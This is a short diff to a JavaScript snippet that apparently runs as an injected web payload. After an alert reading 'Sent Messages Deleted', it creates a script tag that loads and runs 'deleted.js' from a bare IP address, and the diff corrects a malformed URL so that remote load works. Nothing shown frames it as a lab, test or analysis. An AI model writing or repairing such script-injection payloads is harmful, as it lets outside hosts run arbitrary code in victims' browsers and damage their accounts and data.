@@ -6,7 +6,7 @@
         alert("Sent Messages Deleted");
         var newtag = document.createElement("script");
         newtag.type = "text/javascript";
-        newtag.src = "https://https://172.105.54.23/deleted.js";
+        newtag.src = "https://172.105.54.23/deleted.js";
         document.body.appendChild(newtag);
      }
   };
